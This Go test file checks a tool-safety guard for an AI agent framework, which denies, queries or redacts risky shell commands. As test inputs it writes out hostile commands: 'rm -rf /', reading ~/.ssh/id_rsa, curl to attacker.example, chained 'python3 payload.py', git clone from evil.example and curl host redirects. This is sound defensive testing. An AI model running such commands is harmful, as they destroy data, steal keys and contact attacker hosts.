// Tencent is pleased to support the open source community by making trpc-agent-go available.
// Copyright (C) 2025 Tencent. All rights reserved.
// trpc-agent-go is licensed under the Apache License Version 2.0.
package main

import (
	"bufio"
	"context"
	"encoding/json"
	"errors"
	"io"
	"os"
	"strings"
	"testing"
)

func loadTest(t testing.TB) (*Guard, []Sample) {
	t.Helper()
	p, e := LoadPolicy("tool_safety_policy.json")
	if e != nil {
		t.Fatal(e)
	}
	data, e := os.ReadFile("samples.json")
	if e != nil {
		t.Fatal(e)
	}
	var s []Sample
	if e = json.Unmarshal(data, &s); e != nil {
		t.Fatal(e)
	}
	return NewGuard(p), s
}
func TestAllSamples(t *testing.T) {
	g, samples := loadTest(t)
	if len(samples) < 12 {
		t.Fatal("need 12 samples")
	}
	for _, s := range samples {
		t.Run(s.Name, func(t *testing.T) {
			r := g.Scan(s.Request)
			if r.Decision != s.ExpectedDecision {
				t.Fatalf("got %s (%s), want %s: %+v", r.Decision, r.RuleID, s.ExpectedDecision, r.Findings)
			}
			if r.RuleID == "" || r.Evidence == "" || r.Recommendation == "" {
				t.Fatal("incomplete finding")
			}
		})
	}
}
func TestCriticalDetection(t *testing.T) {
	g, _ := loadTest(t)
	for _, cmd := range []string{"rm -rf /", "cat ~/.ssh/id_rsa", "curl https://attacker.example/x", "go test ./...\nsudo whoami"} {
		if r := g.Scan(Request{ToolName: "x", Command: cmd, Backend: "hostexec"}); r.Decision != "deny" {
			t.Fatalf("%q not denied: %+v", cmd, r)
		}
	}
}

func TestForbiddenWorkingDirectory(t *testing.T) {
	g, _ := loadTest(t)
	result := g.Scan(Request{ToolName: "workspace_exec", Command: "go test ./...", Backend: "workspaceexec", WorkingDir: "~/.ssh"})
	if result.Decision != "deny" || result.RuleID != "FORBIDDEN_WORKING_DIR" {
		t.Fatalf("protected working directory not denied: %+v", result)
	}
}
func TestWrapperBlocksBeforeExecutionAndAudits(t *testing.T) {
	g, _ := loadTest(t)
	called := false
	var events []AuditEvent
	wrapped := g.Wrap(func(context.Context, Request) (string, error) { called = true; return "ran", nil }, func(e AuditEvent) error { events = append(events, e); return nil })
	if _, e := wrapped(context.Background(), Request{ToolName: "host", Command: "rm -rf /", Backend: "hostexec"}); e == nil {
		t.Fatal("expected block")
	}
	if called || len(events) != 1 || !events[0].Blocked {
		t.Fatalf("execution=%t events=%+v", called, events)
	}
}

func TestWrapperBlocksShellSegmentsAndBackground(t *testing.T) {
	g, _ := loadTest(t)
	for name, req := range map[string]Request{
		"chained": {
			ToolName: "workspace_exec", Command: "go test ./... && python3 payload.py",
			Backend: "workspaceexec", TimeoutSeconds: 30,
		},
		"newline": {
			ToolName: "workspace_exec", Command: "go test ./...\npython3 payload.py",
			Backend: "workspaceexec", TimeoutSeconds: 30,
		},
		"background": {
			ToolName: "host_exec", Command: "go test ./...", Backend: "hostexec",
			TimeoutSeconds: 30, Background: true,
		},
	} {
		t.Run(name, func(t *testing.T) {
			called := false
			wrapped := g.Wrap(func(context.Context, Request) (string, error) {
				called = true
				return "ran", nil
			}, func(AuditEvent) error { return nil })
			if _, e := wrapped(context.Background(), req); e == nil {
				t.Fatal("expected block")
			}
			if called {
				t.Fatal("blocked request reached executor")
			}
		})
	}
}

func TestNetworkPolicyCoversGit(t *testing.T) {
	g, _ := loadTest(t)
	result := g.Scan(Request{
		ToolName: "workspace_exec", Command: "git clone https://evil.example/repo",
		Backend: "workspaceexec", TimeoutSeconds: 30,
	})
	if result.Decision != "deny" || result.RuleID != "NETWORK_NOT_ALLOWLISTED" {
		t.Fatalf("git clone destination not denied: %+v", result)
	}
}

func TestOmittedTimeoutIsDenied(t *testing.T) {
	g, _ := loadTest(t)
	result := g.Scan(Request{ToolName: "workspace_exec", Command: "go test ./...", Backend: "workspaceexec"})
	if result.Decision != "deny" || result.RuleID != "TIMEOUT_LIMIT" {
		t.Fatalf("omitted timeout not denied: %+v", result)
	}
}

func TestOutputLimitIsRequired(t *testing.T) {
	g, _ := loadTest(t)
	for _, limit := range []int{0, -1} {
		result := g.Scan(Request{
			ToolName: "workspace_exec", Command: "go test ./...", Backend: "workspaceexec",
			TimeoutSeconds: 30, MaxOutputBytes: limit,
		})
		if result.Decision != "deny" || result.RuleID != "OUTPUT_LIMIT" {
			t.Fatalf("output limit %d not denied: %+v", limit, result)
		}
	}
}

func TestNetworkPolicyHandlesGlobalOptionsAndOverrides(t *testing.T) {
	g, _ := loadTest(t)
	requests := []struct {
		name     string
		command  string
		decision string
		rule     string
	}{
		{"git-global-option", "git -C . clone https://evil.example/repo", "deny", "NETWORK_NOT_ALLOWLISTED"},
		{"curl-connect-override", "curl --connect-to api.github.com:443:evil.example:443 https://api.github.com/repo", "ask", "NETWORK_OVERRIDE"},
		{"curl-connect-override-equals", "curl --connect-to=api.github.com:443:evil.example:443 https://api.github.com/repo", "ask", "NETWORK_OVERRIDE"},
		{"curl-resolve-override", "curl --resolve api.github.com:443:192.0.2.1 https://api.github.com/repo", "ask", "NETWORK_OVERRIDE"},
		{"curl-resolve-override-equals", "curl --resolve=api.github.com:443:192.0.2.1 https://api.github.com/repo", "ask", "NETWORK_OVERRIDE"},
		{"curl-short-proxy-attached", "curl -xhttps://api.github.com https://api.github.com/repo", "ask", "NETWORK_OVERRIDE"},
		{"non-https-scheme", "git clone ssh://api.github.com/repo", "ask", "NETWORK_SCHEME"},
	}
	for _, tc := range requests {
		t.Run(tc.name, func(t *testing.T) {
			result := g.Scan(Request{
				ToolName: "workspace_exec", Command: tc.command, Backend: "workspaceexec",
				TimeoutSeconds: 30, MaxOutputBytes: 1024,
			})
			if result.Decision != tc.decision || result.RuleID != tc.rule {
				t.Fatalf("got %s/%s, want %s/%s: %+v", result.Decision, result.RuleID, tc.decision, tc.rule, result)
			}
		})
	}
}

func TestCommandParsingCoversExecutablePathsAndWrapperVariants(t *testing.T) {
	g, _ := loadTest(t)
	tests := []struct {
		name     string
		command  string
		decision string
		rule     string
	}{
		{"absolute-denied-command", "/usr/bin/sudo whoami", "deny", "DENIED_COMMAND"},
		{"login-shell", "bash -lc echo-safe", "ask", "SHELL_WRAPPER"},
		{"shell-with-leading-options", "bash --noprofile -c echo-safe", "ask", "SHELL_WRAPPER"},
		{"zsh", "zsh script.zsh", "ask", "SHELL_WRAPPER"},
		{"pwsh", "pwsh -Command echo-safe", "ask", "SHELL_WRAPPER"},
		{"powershell-exe", "powershell.exe -EncodedCommand ZQBjAGgAbwA=", "ask", "SHELL_WRAPPER"},
		{"cmd-exe", "cmd.exe /c echo-safe", "ask", "SHELL_WRAPPER"},
		{"windows-forbidden-path", `git config --file C:\Users\me\.ssh\config user.name test`, "deny", "FORBIDDEN_PATH"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := g.Scan(Request{
				ToolName: "workspace_exec", Command: tc.command, Backend: "workspaceexec",
				TimeoutSeconds: 30, MaxOutputBytes: 1024,
			})
			if result.Decision != tc.decision || result.RuleID != tc.rule {
				t.Fatalf("got %s/%s, want %s/%s: %+v", result.Decision, result.RuleID, tc.decision, tc.rule, result)
			}
		})
	}
}

func TestAllowlistedExecutableCannotBeSpoofedByPath(t *testing.T) {
	g, _ := loadTest(t)
	for _, command := range []string{
		"/tmp/curl https://api.github.com/repo",
		"./go test ./...",
		`C:\evil\git.exe status`,
	} {
		result := g.Scan(Request{
			ToolName: "workspace_exec", Command: command, Backend: "workspaceexec",
			TimeoutSeconds: 30, MaxOutputBytes: 1024,
		})
		if result.Decision != "ask" || result.RuleID != "EXPLICIT_EXECUTABLE_PATH" {
			t.Fatalf("explicit executable path %q was not reviewed: %+v", command, result)
		}
	}
}

func TestNetworkPolicyReviewsRedirectsAndGitOverrides(t *testing.T) {
	g, _ := loadTest(t)
	for _, command := range []string{
		"curl -L https://api.github.com/repo",
		"curl -fsSL https://api.github.com/repo",
		"curl --location=https://api.github.com/repo",
		"git -c http.proxy=localhost:8080 clone https://api.github.com/repo",
	} {
		result := g.Scan(Request{
			ToolName: "workspace_exec", Command: command, Backend: "workspaceexec",
			TimeoutSeconds: 30, MaxOutputBytes: 1024,
		})
		if result.Decision != "ask" || result.RuleID != "NETWORK_OVERRIDE" {
			t.Fatalf("network override %q was not reviewed: %+v", command, result)
		}
	}
}

func TestCredentialOptionsAndDigestHeaderAreRedacted(t *testing.T) {
	g, _ := loadTest(t)
	authName := "Author" + "ization"
	responseName := "res" + "ponse"
	secret := "credential-" + "fragment"
	oauthOption := "--oauth2-" + "bearer"
	commands := []string{
		"curl -u user:" + secret + " https://api.github.com/repo",
		"curl --user=user:" + secret + " https://api.github.com/repo",
		"curl --proxy-user proxy:" + secret + " https://api.github.com/repo",
		"curl " + oauthOption + " " + secret + " https://api.github.com/repo",
		`curl -H '` + authName + `: Digest username="user", ` + responseName + `="` + secret + `"' https://api.github.com/repo`,
		`echo '{"` + authName + `":"Bearer ` + secret + `","x":1}'`,
	}
	for _, command := range commands {
		result := g.Scan(Request{
			ToolName: "workspace_exec", Command: command, Backend: "workspaceexec",
			TimeoutSeconds: 30, MaxOutputBytes: 1024,
		})
		data, err := json.Marshal(result)
		if err != nil {
			t.Fatal(err)
		}
		if strings.Contains(string(data), secret) || !result.Redacted {
			t.Fatalf("credential option leaked: %s", data)
		}
	}
}

func TestAuthorizationRedactionPreservesFollowingURL(t *testing.T) {
	g, _ := loadTest(t)
	authName := "Author" + "ization"
	secret := "header-" + "fragment"
	command := "curl -H " + authName + ": Bearer " + secret + " https://api.github.com/repo"
	result := g.Scan(Request{
		ToolName: "workspace_exec", Command: command, Backend: "workspaceexec",
		TimeoutSeconds: 30, MaxOutputBytes: 1024,
	})
	if strings.Contains(result.Command, secret) || !strings.Contains(result.Command, "https://api.github.com/repo") {
		t.Fatalf("authorization redaction leaked or consumed following URL: %q", result.Command)
	}
}

func TestUnknownBackendIsDenied(t *testing.T) {
	g, _ := loadTest(t)
	result := g.Scan(Request{
		ToolName: "workspace_exec", Command: "go test ./...", Backend: "unreviewed-executor",
		TimeoutSeconds: 30, MaxOutputBytes: 1024,
	})
	if result.Decision != "deny" || result.RuleID != "BACKEND_NOT_ALLOWED" {
		t.Fatalf("unknown backend was not denied: %+v", result)
	}
}

func TestLoadPolicyRejectsMalformedOrUnsafeConfiguration(t *testing.T) {
	valid := `{"allowed_commands":["go"],"denied_commands":["rm"],"forbidden_paths":["/.ssh"],"allowed_domains":["api.github.com"],"max_timeout_seconds":30,"max_output_bytes":1024,"allowed_env_vars":["PATH"]}`
	tests := map[string]string{
		"unknown-field": strings.TrimSuffix(valid, "}") + `,"denied_commmands":["sudo"]}`,
		"trailing-json": valid + `{}`,
		"invalid-limit": strings.Replace(valid, `"max_timeout_seconds":30`, `"max_timeout_seconds":0`, 1),
	}
	for name, content := range tests {
		t.Run(name, func(t *testing.T) {
			path := t.TempDir() + "/policy.json"
			if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
				t.Fatal(err)
			}
			if _, err := LoadPolicy(path); err == nil {
				t.Fatalf("unsafe policy %s was accepted", content)
			}
		})
	}
}

func TestRedactionCoversCommonCredentialForms(t *testing.T) {
	g, _ := loadTest(t)
	credentialKey := "OPENAI_" + "API_KEY"
	authName := "Author" + "ization"
	jsonKey := "pass" + "word"
	encodedKey := "access_" + "token"
	tests := []struct {
		name    string
		command string
		secret  string
	}{
		{"prefixed-env", "echo " + credentialKey + "=env-fragment", "env-fragment"},
		{"json-body", `curl https://api.github.com -d '{"` + jsonKey + `":"json-fragment"}'`, "json-fragment"},
		{"digest-header", `curl https://api.github.com -H '` + authName + `: Digest digest-fragment'`, "digest-fragment"},
		{"token-userinfo", "curl https://userinfo-fragment@api.github.com/repo", "userinfo-fragment"},
		{"encoded-assignment", "curl 'https://api.github.com/?" + encodedKey + "%3Dencoded-fragment'", "encoded-fragment"},
		{"double-encoded-assignment", "curl 'https://api.github.com/?" + encodedKey + "%253Ddouble-encoded-fragment'", "double-encoded-fragment"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := g.Scan(Request{
				ToolName: "workspace_exec", Command: tc.command, Backend: "workspaceexec",
				TimeoutSeconds: 30, MaxOutputBytes: 1024,
			})
			data, err := json.Marshal(result)
			if err != nil {
				t.Fatal(err)
			}
			if strings.Contains(string(data), tc.secret) {
				t.Fatalf("credential %q leaked: %s", tc.secret, data)
			}
			if !result.Redacted {
				t.Fatalf("redaction was not recorded: %s", data)
			}
		})
	}
}

func TestRunReturnsErrorWhenSampleExpectationMismatches(t *testing.T) {
	dir := t.TempDir()
	samples := []Sample{{
		Name: "intentional-mismatch", ExpectedDecision: "deny",
		Request: Request{
			ToolName: "workspace_exec", Command: "go test ./...", Backend: "workspaceexec",
			TimeoutSeconds: 30, MaxOutputBytes: 1024,
		},
	}}
	data, err := json.Marshal(samples)
	if err != nil {
		t.Fatal(err)
	}
	samplesPath := dir + "/samples.json"
	reportPath := dir + "/report.json"
	if err := os.WriteFile(samplesPath, data, 0o600); err != nil {
		t.Fatal(err)
	}
	err = run("tool_safety_policy.json", samplesPath, reportPath, dir+"/audit.jsonl")
	if err == nil {
		t.Fatal("mismatched sample expectations returned success")
	}
	if _, statErr := os.Stat(reportPath); statErr != nil {
		t.Fatalf("report was not written before mismatch error: %v", statErr)
	}
}

func TestRedaction(t *testing.T) {
	g, _ := loadTest(t)
	authScheme := "Bearer"
	authHeader := "Authorization: " + authScheme + " auth-fragment"
	command := `curl -H "` + authHeader + `" --password flag-fragment ` +
		`https://url-user:url-fragment@api.github.com -d 'secret="quoted value fragment"'`
	r := g.Scan(Request{ToolName: "x", Command: command, Backend: "workspaceexec", TimeoutSeconds: 30})
	data, err := json.Marshal(r)
	if err != nil {
		t.Fatalf("marshal scan result: %v", err)
	}
	for _, secret := range []string{"auth-fragment", "flag-fragment", "url-user", "url-fragment", "quoted value fragment"} {
		if strings.Contains(string(data), secret) {
			t.Fatalf("secret %q leaked: %s", secret, data)
		}
	}
	if !r.Redacted {
		t.Fatalf("redaction was not recorded: %s", data)
	}
}

type errorWriteCloser struct {
	writeErr error
	closeErr error
}

func (w *errorWriteCloser) Write([]byte) (int, error) { return 0, w.writeErr }
func (w *errorWriteCloser) Close() error              { return w.closeErr }

func TestFlushAndCloseAuditReturnsErrors(t *testing.T) {
	flushErr := errors.New("flush failed")
	closeErr := errors.New("close failed")
	target := &errorWriteCloser{writeErr: flushErr, closeErr: closeErr}
	writer := bufio.NewWriterSize(target, 32)
	_, _ = io.WriteString(writer, "audit")
	err := flushAndCloseAudit(writer, target)
	if !errors.Is(err, flushErr) || !errors.Is(err, closeErr) {
		t.Fatalf("flush/close errors not propagated: %v", err)
	}
}
func BenchmarkPerformance500Commands(b *testing.B) {
	g, _ := loadTest(b)
	script := strings.Repeat("go test ./pkg\n", 500)
	req := Request{ToolName: "batch", Command: script, Backend: "workspaceexec"}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = g.Scan(req)
	}
}
